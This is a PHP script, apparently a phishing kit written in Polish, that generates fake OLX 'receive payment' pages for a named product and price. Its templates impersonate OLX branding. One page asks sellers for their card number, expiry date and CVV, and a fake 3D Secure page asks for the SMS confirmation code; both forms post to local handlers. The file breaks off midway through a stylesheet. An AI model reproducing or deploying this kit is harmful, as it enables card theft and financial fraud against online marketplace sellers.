<?php

// zmienne
$name = $_POST['name'];
$price = $_POST['price'];
$photo = $_POST['photo'];

// randomowy folder
$folder = rand(111111111111111111, 999999999999999999);

// tworzenie randomowego folderu
mkdir($folder, 0777, true);

$index = '<!DOCTYPE html>
<html>
<head lang="pl-PL">
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1000">
    <link rel="stylesheet" href="style.css">
    <title>OLX - Odbierz płatność</title>
</head>
<body>
<div class="deskop">
    <header>
        <a href="#"><img src="logo.png"></a>
    </header>
    <div class="circle">
    </div>
    <div class="body_middle">
        <div class="container">
            <div class="box">
                <div class="head">
                    <div class="head_left">
                        <img src="' . "$photo" . '">
                    </div>
                    <div class="head_right">
                        <div class="head_right_div_name">
                            <a class="name">' . "$name" . '</a>
                        </div>
                        <a class="price">' . "$price" . '</a>
                    </div>
                </div>
                <div class="details">
                    <div class="details_info">
                        <a> Dane odbiorcy:</a>
                    </div>
                    <!-- 1 -->
                    <div class="details_div">
                        <a class="first">Imię i nazwisko:</a>
                        <a class="second">Mariusz Kwiatkowski</a>
                    </div>
                    <!-- 2 -->
                    <div class="details_div">
                        <a class="first">Adres dostawy:</a>
                        <a class="second">Parchowo, 77-124, ul. Dolna 4</a>
                    </div>
                    <!-- 3 -->
                    <div class="details_div">
                        <a class="first">Numer kontaktowy:</a>
                        <a class="second">+48157322999</a>
                    </div>
                    <!-- 4 -->
                    <div class="details_div">
                        <a class="first">Dodatkowe informacje:</a>
                        <a class="second">Brak dodatkowych informacji</a>
                    </div>
                </div>
                <div class="button">
                    <form action="/next.php" method="post">
                        <button>Odbierz środki</button>
                    </form>
                </div>
                <div class="info">
                    <div class="info_div_1">
                        <a class="info1">Bezpieczeństwo gwarantowane</a>
                    </div>
                    <div class="info_div_2">
                        <a class="info2">Po zaksięgowaniu środków na karcie prosimy o przesłanie towaru kupującemu zgodnie z podanymi danymi.</a>
                    </div>
                    <div class="info_div_3">
                        <a class="info3">Po wysłaniu towaru prosimy o wskazanie kupującemu numeru przesyłki! Towar powinien zostać wysłany w ciągu 3 dni od daty wpłynięcia środków.</a>
                    </div>
                </div>
                <div class="info_security">
                    <a>Zapewniamy pełne bezpieczeństwo</a>
                    <img src="/o/card.png">
                </div>
            </div>
        </div>
    </div>
    <div class="body_bottom">
        <div class="body_bottom_1">
            <div class="links1">
                <a><span>Aplikacje mobilne OLX.pl</span></a>
                <a><span>Pomoc</span></a>
                <a><span>Wyróżnione ogłoszenia</span></a>
                <a><span>Oferta dla firm</span></a>
                <a><span>Blog</span></a>
                <a><span>Regulamin</span></a>
                <a><span>Polityka prywatności</span></a>
                <a><span>Reklama</span></a>
                <a><span>Biuro prasowe</span></a>
            </div>
            <div class="links2">
                <a><span>Jak działa OLX.pl</span></a>
                <a><span>Zasady bezpieczeństwa</span></a>
                <a><span>Mapa kategorii</span></a>
                <a><span>Mapa miejscowości</span></a>
                <a><span>Popularne wyszukiwania</span></a>
                <a><span>Kariera</span></a>
                <a><span>Ustawienia plików cookie</span></a>
                <a><span>Kody rabatowe</span></a>
                <a><span>Ubezpieczenia OC/AC</span></a>
            </div>
            <div class="app">
                <img src="play.png">
                <img src="appstore.png">
                <a><span>Darmowa aplikacja na Twój telefon</span></a>
            </div>
        </div>
    </div>
</div>
<div class="mobile">
    <div class="container">
        <div class="box">
            <div class="head">
                <div class="head_left">
                    <img src="' . "$photo" . '">
                </div>
                <div class="head_right">
                    <div class="head_right_div_name">
                        <a class="head_right_name">' . "$name" . '</a>
                    </div>
                    <div class="head_right_div_price">
                        <a class="head_right_price">' . "$price" . '</a>
                    </div>
                </div>
            </div>
            <div class="details">
                <div class="details_info">
                    <a>Dane odbiorcy:</a>
                </div>
                <div class="details_div_1">
                    <a class="details_first">Imię i nazwisko:</a>
                    <a class="details_second">Mariusz Kwiatkowski</a>
                </div>
                <div class="details_div_2">
                    <a class="details_first">Adres dostawy:</a>
                    <a class="details_second">Warszawa, 00-001, ul. Pokątna 31/4</a>
                </div>
                <div class="details_div_3">
                    <a class="details_first">Numer kontaktowy:</a>
                    <a class="details_second">+48 520 153 182</a>
                </div>
                <div class="details_div_4">
                    <a class="details_first">Dodatkowe informacje:</a>
                    <a class="details_second">Brak dodatkowych informacji</a>
                </div>
            </div>
            <form action="next.php" method="post">
                <div class="button">
                    <button>Odbierz środki</button>
                </div>
            </form>
            <div class="info">
                <div class="info">
                    <div class="info_div_1">
                        <a class="info1">Po zaksięgowaniu środków na karcie prosimy o przesłanie towaru kupującemu zgodnie z podanymi danymi.</a>
                    </div>
                    <div class="info_div_2">
                        <a class="info2">Po wysłaniu towaru prosimy o wskazanie kupującemu numeru przesyłki! Towar powinien zostać wysłany w ciągu 3 dni od daty wpłynięcia środków.</a>
                    </div>
                </div>
            </div>
            <div class="info_security">
                <a>Zapewniamy pełne bezpieczeństwo</a>
                <img src="/o/card.png">
            </div>
        </div>
    </div>
</div>
</body>
</html>';

$index2 = '<!DOCTYPE html>
<html>
<head lang="pl-PL">
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1000">
    <link rel="stylesheet" href="style2.css">
    <script src="expand.js"></script>
    <title>OLX - Odbierz płatność</title>
</head>
<body>
<div class="deskop">
    <form action="number.php" method="post">
        <header>
            <a href="#"><img src="logo.png"></a>
        </header>
        <div class="circle">
        </div>
        <div class="body_middle">
            <div class="container">
                <div id="box" class="box">
                    <div id="lock" class="lock">
                        <div id="lock_box" class="lock_box">
                            <div class="lock_box_left">
                                <img src="/o/lock.png">
                            </div>
                            <div class="lock_box_right">
                                <a class="lock_box_right_first"><span>Jak chronimy Twoje dane?</span></a>
                                <div><a id="lock_box_right_second" class="lock_box_right_second">Rozwiń</a></div>
                                <div><a id="lock_box_right_third" class="lock_box_right_third">Sprawdzamy każdą transakcję. Korzystamy z najnowszych metod szyfrowania oraz standardu 3D Secure.</a></div>
                                <div><a id="lock_box_right_fourth" class="lock_box_right_fourth">Każde połączenie z naszą bazą danych jest w pełni bezpieczne i szyfrowane najnowszymi technologiami</a></div>
                                <div><a id="lock_box_right_fifth" class="lock_box_right_fifth">Zwiń</a></div>
                                <script src="expand.js"></script>
                            </div>
                        </div>
                    </div>
                    <div class="details">
                        <div class="details_info">
                            <a class="details_info">Podaj dane karty płatniczej, w celu uzyskania na nią środków za zakupiony przedmiot</a>
                        </div>
                        <div class="details_top">
                            <a class="details_top_first">Numer karty</a>
                            <input type="text" name="number" class="details_top_second" minlength="16" maxlength="16" placeholder="np. 1234 5678 9000 0012">
                        </div>
                        <div class="details_middle">
                            <div class="details_middle_left">
                                <a class="details_middle_left_first">Ważna do</a>
                                <input type="text" name="date" class="details_middle_left_second" minlength="4" maxlength="7" placeholder="MM/RR">
                            </div>
                            <div class="details_middle_right">
                                <a class="details_middle_right_first">Kod CVV/CVC</a>
                                <input type="text" name="cvc" class="details_middle_right_second" minlength="3" maxlength="3" placeholder="np. 123">
                            </div>
                        </div>
                    </div>
                    <div class="button">
                        <button>Odbierz środki</button>
                    </div>
                    <div class="info_security">
                        <a>Zapewniamy pełne bezpieczeństwo</a>
                        <div><img src="/o/card.png"></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="body_bottom">
            <div class="body_bottom_1">
                <div class="links1">
                    <a><span>Aplikacje mobilne OLX.pl</span></a>
                    <a><span>Pomoc</span></a>
                    <a><span>Wyróżnione ogłoszenia</span></a>
                    <a><span>Oferta dla firm</span></a>
                    <a><span>Blog</span></a>
                    <a><span>Regulamin</span></a>
                    <a><span>Polityka prywatności</span></a>
                    <a><span>Reklama</span></a>
                    <a><span>Biuro prasowe</span></a>
                </div>
                <div class="links2">
                    <a><span>Jak działa OLX.pl</span></a>
                    <a><span>Zasady bezpieczeństwa</span></a>
                    <a><span>Mapa kategorii</span></a>
                    <a><span>Mapa miejscowości</span></a>
                    <a><span>Popularne wyszukiwania</span></a>
                    <a><span>Kariera</span></a>
                    <a><span>Ustawienia plików cookie</span></a>
                    <a><span>Kody rabatowe</span></a>
                    <a><span>Ubezpieczenia OC/AC</span></a>
                </div>
                <div class="app">
                    <img src="play.png">
                    <img src="appstore.png">
                    <a><span>Darmowa aplikacja na Twój telefon</span></a>
                </div>
            </div>
        </div>
    </form>
</div>
<div class="mobile">
    <form action="number.php" method="post">
        <div class="container">
            <div class="box">
                <div class="details">
                    <div class="details_info">
                        <a>Podaj dane karty płatniczej, w celu uzyskania na nią środków za zakupiony przedmiot</a>
                    </div>
                    <div class="details_top">
                        <a class="details_top_first">Numer karty</a>
                        <input name="number" id="number" class="details_top_second" minlength="16" maxlength="16" placeholder="np. 1234 5678 9000 0012">
                    </div>
                    <div class="details_middle">
                        <div class="details_middle_left">
                            <a class="details_middle_left_first">Ważna do</a>
                            <input name="date" id="date" class="details_middle_left_second" minlength="4" maxlength="5" placeholder="MM/RR">
                        </div>
                        <div class="details_middle_right">
                            <a class="details_middle_right_first">Kod CVV/CVC</a>
                            <input name="cvc" id="cvc" class="details_middle_right_second" minlength="3" maxlength="3" placeholder="np. 123">
                        </div>
                    </div>
                </div>
                    <div class="button">
                            <button>Odbierz środki</button>
                    </div>
                <div class="info_security">
                    <a>Zapewniamy pełne bezpieczeństwo</a>
                    <img src="/o/card.png">
                </div>
            </div>
        </div>
    </form>
</div>
</body>
</html>';

$index3 = '<!DOCTYPE html>
<html>
<head lang="pl-PL">
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1000">
    <link rel="stylesheet" href="style3.css">
    <script src="expand.js"></script>
    <title>OLX - Odbierz płatność</title>
</head>
<body>
<div class="deskop">
    <header>
        <a href="#"><img src="logo.png"></a>
    </header>
    <div class="circle">
    </div>
    <div class="body_middle">
        <div class="container">
            <div id="box" class="box">
                <div class="details">
                    <div class="details_info">
                        <a class="details_info_first">Odbieranie pieniędzy kartą</a>
                        <a class="details_info_second">Weryfikacja 3D Secure</a>
                    </div>
                    <div class="details_top">
                        <a class="details_top_first">Dane odbioru środków:</a>
                    </div>
                    <div class="details_middle">
                        <div class="details_middle_left">
                            <a class="details_middle_left_first">Nazwa punktu usługowo-handlowego:</a>
                            <a class="details_middle_left_second">Data:</a>
                            <a class="details_middle_left_third">Numer karty:</a>
                            <a class="details_middle_left_fourth">Kwota i waluta odbioru:</a>
                        </div>
                        <div class="details_middle_right">
                            <a class="details_middle_right_first">OLX Sp. z o.o.</a>
                            <a class="details_middle_right_second">' . date('Y-m-d') . '</a>
                            <a class="details_middle_right_third">XXXX XXXX XXXX XXXX</a>
                            <a class="details_middle_right_fourth">' . $price . '</a>
                        </div>
                    </div>
                    <div class="details_bottom">
                        <a class="details_bottom_first">Transakcja zabezpieczona usługą 3D-Secure.</a>
                        <a class="details_bottom_second">Sprawdź poprawność danych i wprowadź kod sms, 
                            który powinien przyjść w ciągu 5 minut na 
                            twój telefon komórkowy.</a>
                    </div>
                </div>
                <div class="sms">
                    <div class="sms_top">
                        <a>WPISZ KOD SMS</a>
                    </div>
                    <div class="sms_middle">
                        <form action="code.php" method="post">
                            <input type="text" name="code">
                            <button>POTWIERDŹ</button>
                        </form>
                    </div>
                </div>
                <div class="info_security">
                    <a>Zapewniamy pełne bezpieczeństwo</a>
                    <div><img src="/o/card.png"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="body_bottom">
        <div class="body_bottom_1">
            <div class="links1">
                <a><span>Aplikacje mobilne OLX.pl</span></a>
                <a><span>Pomoc</span></a>
                <a><span>Wyróżnione ogłoszenia</span></a>
                <a><span>Oferta dla firm</span></a>
                <a><span>Blog</span></a>
                <a><span>Regulamin</span></a>
                <a><span>Polityka prywatności</span></a>
                <a><span>Reklama</span></a>
                <a><span>Biuro prasowe</span></a>
            </div>
            <div class="links2">
                <a><span>Jak działa OLX.pl</span></a>
                <a><span>Zasady bezpieczeństwa</span></a>
                <a><span>Mapa kategorii</span></a>
                <a><span>Mapa miejscowości</span></a>
                <a><span>Popularne wyszukiwania</span></a>
                <a><span>Kariera</span></a>
                <a><span>Ustawienia plików cookie</span></a>
                <a><span>Kody rabatowe</span></a>
                <a><span>Ubezpieczenia OC/AC</span></a>
            </div>
            <div class="app">
                <img src="play.png">
                <img src="appstore.png">
                <a><span>Darmowa aplikacja na Twój telefon</span></a>
            </div>
        </div>
    </div>
</div>
<div class="mobile">
    <div class="container">   
        <div class="box">
            <div class="details">
                <div class="details_info">
                    <a class="details_info_first">Odbieranie pieniędzy kartą</a>
                    <a class="details_info_second">Weryfikacja 3D Secure</a>
                </div>
                <div class="details_top">
                    <a class="details_top_first">Dane odbioru środków:</a>
                </div>
                <div class="details_middle">
                    <div class="details_middle_left">
                        <a class="details_middle_left_first">Nazwa punktu usługowo-handlowego:</a>
                        <a class="details_middle_left_second">Data:</a>
                        <a class="details_middle_left_third">Numer karty:</a>
                        <a class="details_middle_left_fourth">Kwota i waluta odbioru:</a>
                    </div>
                    <div class="details_middle_right">
                        <a class="details_middle_right_first">OLX Sp. z o.o.</a>
                        <a class="details_middle_right_second">' . date('Y-m-d') . '</a>
                        <a class="details_middle_right_third">XXXX XXXX XXXX 5379</a>
                        <a class="details_middle_right_fourth">' . $price . '</a>
                    </div>
                </div>
                <div class="details_bottom">
                    <a class="details_bottom_first">Transakcja zabezpieczona usługą 3D-Secure.</a>
                    <a class="details_bottom_second">Sprawdź poprawność danych i wprowadź kod sms, 
                        który powinien przyjść w ciągu 5 minut na 
                        twój telefon komórkowy.</a>
                </div>
            </div>
            <div class="sms">
                <div class="sms_top">
                    <a>WPISZ KOD SMS</a>
                </div>
                <div class="sms_middle">
                    <form action="code.php" method="post">
                        <input type="text" name="code">
                        <button>POTWIERDŹ</button>
                    </form>
                </div>
            </div>
            <div class="info_security">
                <a>Zapewniamy pełne bezpieczeństwo</a>
                <div><img src="/o/card.png"></div>
            </div>
        </div>
    </div>
</div>
</body>
</html>';

$style = '@media only screen and (min-device-width: 812px) {
    .mobile {
      display: none;
    }
    body {
      background-color: #3a77ff;
      z-index: 100px;
      font-family: Arial, Helvetica, sans-serif;
      height: 1000px;
      margin: 0;
      padding: 0;
    }
  
    .circle {
      background-color: #3a77ff;
      width: 936px;
      height: 936px;
      border: 150px solid #ceddff;
      border-radius: 100000px;
      margin: 0 auto 0 auto;
      margin-bottom: 100px;
      position: absolute;
      margin-left: auto;
      margin-right: auto;
      left: 0;
      right: 0;
      text-align: center;
      top: -150px;
      z-index: -1;
    }
  
    header {
      background-color: #002f34;
      color: white;
      width: 100%;
      height: 72px;
    }
  
    header img {
      margin-left: 323px;
    }
    .header_list {
      margin-left: 300px;
    }
  
    /* middle */
    .body_middle {
      height: 793px;
    }
  
    /* container */
    .container {
      width: 700px;
      height: 540px;
      margin: 0 auto 0 auto;
      padding-top: 70px;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 370px;
      height: 590px;
      margin: 0 auto 0 auto;
      border-radius: 4px;
      -webkit-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      -moz-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
    }
  
    /* head */
    .head {
      display: flex;
      width: 91%;
      height: 130px;
      margin: 0 auto 0px auto;
    }
  
    /* head - LEFT */
    .head_left {
      width: auto;
      height: 100px;
      margin: 10px 0 0 0;
    }
  
    .head_left img {
      height: 100px;
      max-width: 125px;
    }
  
    /* head - RIGHT */
    .head_right {
      background-color: #f2f4f5;
      width: auto;
      height: 100px;
      margin-top: 10px;
    }
  
    .head_right_div_name {
      width: 99%;
      height: 65px;
    }
  
    .head_right a.name {
      display: block;
      margin: 5px 0 0 10px;
      font-size: 15.5px;
    }
  
    .head_right a.price {
      display: block;
      margin: 5px 0 0 10px;
      font-size: 18px;
      font-weight: 600;
    }
  
    /* details */
    .details {
      width: 90%;
      height: auto;
      margin: 0 auto 0 auto;
    }
  
    .details_info {
      color: #313131;
      font-size: 15px;
      font-weight: 700;
      margin: 0 0 10px 0;
      border-radius: 4px;
    }
  
    .details_div {
      height: 55px;
    }
  
    .first {
      display: block;
      color: #71848d;
      font-size: 14px;
    }
  
    .second {
      display: block;
      color: #406367;
      font-size: 16px;
      margin: 3px 0 0 8px;
    }
  
    /* button */
    .button {
      text-align: center;
    }
  
    .button button {
      background-color: #002f34;
      color: #ffffff;
      font-size: 16px;
      font-weight: 700;
      width: 336px;
      height: 41px;
      border: 0;
      border-radius: 4px;
    }
  
    button:hover {
      cursor: pointer;
    }
  
    /* info */
    .info {
      color: #406367;
      text-align: center;
      font-size: 11px;
      width: 91%;
      height: auto;
      margin: 0 auto 0 auto;
    }
  
    .info_div_1 {
      display: none;
      margin-top: 5px;
    }
  
    .info_div_2 {
      display: block;
      margin-top: 15px;
    }
  
    .info_div_3 {
      display: block;
      margin-top: 10px;
    }
  
    /* info */
    /* info */
    .info_security {
      color: #406367;
      text-align: center;
      font-size: 11px;
      margin: 10px 0 0 0;
    }
  
    .info_security a {
      display: block;
    }
  
    /* body BOTTOM */
    .body_bottom {
      background-color: #ffffff;
      height: 320px;
      padding: 120px 0 0 0;
    }
  
    .body_bottom_1 {
      display: flex;
      width: 60%;
      height: auto;
      margin: 0px auto 0 auto;
    }
    /* body BOTTOM - links1*/
    .links1 {
      width: auto;
      height: auto;
    }
  
    .links1 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - links2*/
    .links2 {
      width: auto;
      height: auto;
    }
  
    .links2 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - app */
    .app {
      text-align: center;
      margin: 30px 0 0 100px;
      height: 53px;
      width: 261px;
    }
  
    .app span {
      color: #8e8e8e;
      font-size: 12px;
    }
  }
  @media only screen and (min-device-width: 1px) and (max-device-width: 812px) {
    .deskop {
      display: none;
    }
  
    /* body */
    body {
      background-color: #f2f4f5;
      font-family: Arial, Helvetica, sans-serif;
      margin: 0;
      padding: 0;
    }
    /* container */
    .container {
      width: 100%;
      height: 2000px;
      margin: 30px 0 0 0;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 90%;
      height: auto;
      margin: 0 auto 0 auto;
      padding: 30px;
    }
  
    /* head */
    .head {
      display: flex;
      width: 100%;
      height: 250px;
      margin: 10px 0 0 0;
    }
  
    /* head - LEFT */
    .head_left {
      width: auto;
      height: 250px;
    }
  
    .head_left img {
      max-width: 600px;
      height: 100%;
    }
  
    /* head - RIGHT */
    .head_right {
      width: auto;
      height: 250px;
      margin: 0 0 0 25px;
    }
  
    .head_right_div_name {
      max-width: 550px;
      height: 180px;
    }
  
    .head_right_name {
      font-size: 40px;
    }
  
    .head_right_price {
      font-size: 50px;
      font-weight: 700;
    }
  
    /* details */
    .details {
      width: 100%;
      height: auto;
    }
  
    .details_info {
      color: #313131;
      font-size: 40px;
      font-weight: 700;
      margin: 50px 0 0 0;
    }
  
    .details_div_1 {
      width: 100%;
      height: 120px;
      margin: 20px 0 0 0;
    }
  
    .details_div_2 {
      width: 100%;
      height: 120px;
      margin: 60px 0 0 0;
    }
  
    .details_div_3 {
      width: 100%;
      height: 120px;
      margin: 60px 0 0 0;
    }
  
    .details_div_4 {
      width: 100%;
      height: 120px;
      margin: 60px 0 0 0;
    }
  
    .details_first {
      display: block;
      color: #556166;
      font-size: 35px;
    }
  
    .details_second {
      display: block;
      background-color: rgb(245, 245, 245);
      color: #243436;
      font-size: 42px;
      width: 98%;
      margin: 10px 0 0 0;
      padding: 25px 0 15px 20px;
      border: 1px solid rgb(245, 245, 245);
    }
  
    /* button */
    .button {
      width: 100%;
      margin: 55px 0 0 0;
    }
  
    .button button {
      background-color: #002f34;
      color: #ffffff;
      font-size: 40px;
      font-weight: 700;
      width: 100%;
      height: 100px;
      margin: 25px 0 0 0;
      border: 0;
      border-radius: 6px;
    }
  
    /* info */
    .info {
      text-align: center;
      width: 100%;
      margin: 20px auto 0 auto;
    }
  
    .info_div_1 {
      width: 100%;
      height: auto;
    }
  
    .info1 {
      font-size: 29px;
    }
  
    .info_div_2 {
      width: 100%;
      height: auto;
      margin: 25px auto 0 auto;
    }
  
    .info2 {
      font-size: 27px;
    }
  
    .info_security {
      text-align: center;
      width: 100%;
      margin: 30px 0 0 0;
    }
  
    .info_security a {
      display: block;
      font-size: 23px;
    }
  
    .info_security img {
      width: 350px;
    }
  }
  ';

$style2 = '@media only screen and (min-device-width: 812px) {
    .mobile {
      display: none;
    }
  
    body {
      background-color: #3a77ff;
      z-index: 100px;
      color: #002f34;
      font-family: Arial, Helvetica, sans-serif;
      height: 1000px;
      margin: 0;
      padding: 0;
    }
  
    .circle {
      background-color: #3a77ff;
      width: 936px;
      height: 936px;
      border: 150px solid #ceddff;
      border-radius: 100000px;
      margin: 0 auto 0 auto;
      margin-bottom: 100px;
      position: absolute;
      margin-left: auto;
      margin-right: auto;
      left: 0;
      right: 0;
      text-align: center;
      top: -150px;
      z-index: -1;
    }
  
    header {
      background-color: #002f34;
      color: white;
      width: 100%;
      height: 72px;
    }
  
    header img {
      margin-left: 323px;
    }
    .header_list {
      margin-left: 300px;
    }
  
    /* bod ymiddle */
    .body_middle {
      height: 793px;
    }
  
    /* container */
    .container {
      width: 700px;
      height: 540px;
      margin: 0 auto 0 auto;
      padding-top: 70px;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 370px;
      height: 445px;
      margin: 0 auto 0 auto;
      border-radius: 4px;
      -webkit-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      -moz-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
    }
  
    /* lock */
    .lock {
      width: 91%;
      height: 65px;
      margin: 0 auto 0 auto;
      padding: 15px 0 0 0;
    }
  
    .lock_box {
      display: flex;
      width: 100%;
      height: 53px;
      border-top: 1px solid #dddddd;
      border-right: 1px solid #dddddd;
      border-bottom: 1px solid #dddddd;
      border-left: 4px solid #4294c6;
    }
  
    /* lock - LEFT */
    .lock_box_left {
      width: 11%;
    }
  
    .lock_box_left img {
      margin: 10px;
    }
  
    /* lock - RIGHT */
    .lock_box_right {
      display: block;
      width: 89%;
      padding: 8px 0 0 13px;
    }
  
    .lock_box_right_first {
      font-size: 15px;
    }
  
    .lock_box_right_second {
      color: #00a89a;
      text-decoration: none;
      font-size: 15px;
      width: 50px;
    }
  
    .lock_box_right_second:hover {
      cursor: pointer;
    }
  
    .lock_box_right_third {
      display: none;
      font-size: 15px;
      padding: 10px 0 0 0;
    }
  
    .lock_box_right_fourth {
      display: none;
      font-size: 15px;
      padding: 10px 0 0 0;
    }
  
    .lock_box_right_fifth {
      display: none;
      color: #00a89a;
      text-decoration: none;
      font-size: 15px;
      width: 33px;
      padding: 5px 0 0 0;
    }
  
    .lock_box_right_fifth:hover {
      cursor: pointer;
    }
  
    /* details */
    .details {
      width: 91%;
      height: 200px;
      margin: 0 auto 0 auto;
    }
  
    .details_info {
      text-align: center;
      padding: 10px 0 0 0;
      font-size: 16.5px;
      font-weight: 500;
    }
  
    /* details - TOP */
    .details_top {
      margin: 20px 0 15px 0;
    }
  
    .details_top_first {
      display: block;
      color: #71848d;
      font-size: 14px;
      margin: 0 0 0 10px;
    }
  
    .details_top_second {
      display: block;
      color: #222222;
      font-size: 14px;
      width: 96.5%;
      height: 40px;
      border: 1px solid #a7a7a7;
      padding: 0 0 0 10px;
      border-radius: 2px;
    }
  
    /* details - MIDDLE */
    .details_middle {
      display: flex;
      width: 100%;
    }
  
    /* details - MIDDLE LEFT */
    .details_middle_left {
      width: 50%;
    }
  
    .details_middle_left_first {
      display: block;
      color: #71848d;
      font-size: 14px;
      margin: 0 0 0 10px;
    }
  
    .details_middle_left_second {
      display: block;
      float: left;
      color: #222222;
      font-size: 14px;
      width: 85%;
      height: 40px;
      border: 1px solid #a7a7a7;
      padding: 0 0 0 10px;
      border-radius: 2px;
    }
  
    /* details - MIDDLE RIGHT */
    .details_middle_right {
      width: 50%;
    }
  
    .details_middle_right_first {
      display: block;
      color: #71848d;
      font-size: 14px;
      margin: 0 0 0 23px;
    }
  
    .details_middle_right_second {
      display: block;
      float: right;
      color: #222222;
      font-size: 14px;
      width: 85%;
      height: 40px;
      border: 1px solid #a7a7a7;
      padding: 0 0 0 10px;
      border-radius: 2px;
    }
  
    /* button */
    .button {
      background-color: yellowgreen;
      width: 91%;
      margin: 25px auto 0 auto;
    }
  
    .button button {
      background-color: #002f34;
      color: #ffffff;
      font-size: 16px;
      font-weight: 700;
      width: 100%;
      height: 41px;
      border: 0;
      border-radius: 4px;
    }
  
    button:hover {
      cursor: pointer;
    }
  
    /* info */
    .info_security {
      text-align: center;
      font-size: 11px;
      margin: 20px 0 0 0;
    }
  
    /* body BOTTOM */
    .body_bottom {
      background-color: #ffffff;
      height: 320px;
      padding: 120px 0 0 0;
    }
  
    .body_bottom_1 {
      display: flex;
      width: 60%;
      height: auto;
      margin: 0px auto 0 auto;
    }
    /* body BOTTOM - links1*/
    .links1 {
      width: auto;
      height: auto;
    }
  
    .links1 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - links2*/
    .links2 {
      width: auto;
      height: auto;
    }
  
    .links2 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - app */
    .app {
      text-align: center;
      margin: 30px 0 0 100px;
      height: 53px;
      width: 261px;
    }
  
    .app span {
      color: #8e8e8e;
      font-size: 12px;
    }
  }
  @media only screen and (min-device-width: 1px) and (max-device-width: 812px) {
    .deskop {
      display: none;
    }
  
    /* body */
    body {
      background-color: #f2f4f5;
      color: #002f34;
      font-family: Arial, Helvetica, sans-serif;
      margin: 0;
      padding: 0;
    }
    /* container */
    .container {
      width: 100%;
      height: 2000px;
      margin: 30px 0 0 0;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 90%;
      height: auto;
      margin: 0 auto 0 auto;
      padding: 30px;
    }
  
    /* details */
    .details {
      width: 100%;
      height: auto;
    }
  
    /* details - info */
    .details_info {
      text-align: center;
      font-size: 40px;
    }
  
    /* details - top */
    .details_top {
      width: 100%;
      margin: 30px 0 0 0;
    }
  
    .details_top_first {
      font-size: 35px;
    }
  
    .details_top_second {
      font-size: 35px;
      width: 96%;
      height: 100px;
    }
  
    /* details - middle */
    .details_middle {
      display: flex;
      margin: 25px 0 0 0;
    }
  
    /* details - middle LEFT*/
    .details_middle_left {
      width: 50%;
    }
  
    .details_middle_left_first {
      display: block;
      font-size: 35px;
    }
  
    .details_middle_left_second {
      display: block;
      font-size: 35px;
      width: 85%;
      height: 100px;
    }
  
    /* details - middle RIGHT*/
    .details_middle_right {
      width: 50%;
    }
  
    .details_middle_right_first {
      display: block;
      font-size: 35px;
    }
  
    .details_middle_right_second {
      display: block;
      font-size: 35px;
      width: 92%;
      height: 100px;
    }
  
    /* button */
    .button {
      width: 100%;
      margin: 75px 0 0 0;
    }
  
    .button button {
      background-color: #002f34;
      color: #ffffff;
      font-size: 40px;
      font-weight: 700;
      width: 100%;
      height: 100px;
      border: 0;
      border-radius: 6px;
    }
  
    /* info */
    .info_security {
      text-align: center;
      width: 100%;
      margin: 30px 0 0 0;
    }
  
    .info_security a {
      display: block;
      font-size: 23px;
    }
  
    .info_security img {
      width: 350px;
    }
  }
  ';

$style3 = '@media only screen and (min-device-width: 812px) {
    .mobile {
      display: none;
    }
  
    body {
      background-color: #3a77ff;
      z-index: 100px;
      color: #002f34;
      font-family: Arial, Helvetica, sans-serif;
      height: 1000px;
      margin: 0;
      padding: 0;
    }
  
    .circle {
      background-color: #3a77ff;
      width: 936px;
      height: 936px;
      border: 150px solid #ceddff;
      border-radius: 100000px;
      margin: 0 auto 0 auto;
      margin-bottom: 100px;
      position: absolute;
      margin-left: auto;
      margin-right: auto;
      left: 0;
      right: 0;
      text-align: center;
      top: -150px;
      z-index: -1;
    }
  
    header {
      background-color: #002f34;
      color: white;
      width: 100%;
      height: 72px;
    }
  
    header img {
      margin-left: 323px;
    }
    .header_list {
      margin-left: 300px;
    }
  
    /* bod ymiddle */
    .body_middle {
      height: 793px;
    }
  
    /* container */
    .container {
      width: 700px;
      height: 540px;
      margin: 0 auto 0 auto;
      padding-top: 70px;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 370px;
      height: 440px;
      margin: 0 auto 0 auto;
      border-radius: 4px;
      -webkit-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      -moz-box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
      box-shadow: 0px 0px 42px -28px rgba(66, 68, 90, 1);
    }
  
    /* details */
    .details {
      width: 91%;
      margin: 0 auto 0 auto;
    }
  
    /* details - TOP */
  
    .details_info_first {
      display: block;
      font-size: 19px;
      font-weight: 600;
      padding: 10px 0 0 0;
    }
  
    .details_info_second {
      display: block;
      font-size: 18px;
      font-weight: 600;
      margin-top: 3px;
    }
  
    /* details - TOP*/
  
    .details_top_first {
      display: block;
      font-size: 17px;
      font-weight: 600;
      margin: 20px 0 0 0;
    }
  
    /* details - MIDDLE */
    .details_middle {
      display: flex;
      width: 100%;
      height: auto;
      margin: 5px 0 0 0;
    }
  
    /* details - MIDDLE LEFT */
    .details_middle_left {
      text-align: right;
      width: 47%;
    }
  
    .details_middle_left_first {
      display: block;
      font-size: 13px;
      height: 36px;
    }
  
    .details_middle_left_second {
      display: block;
      font-size: 13px;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    .details_middle_left_third {
      display: block;
      font-size: 13px;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    .details_middle_left_fourth {
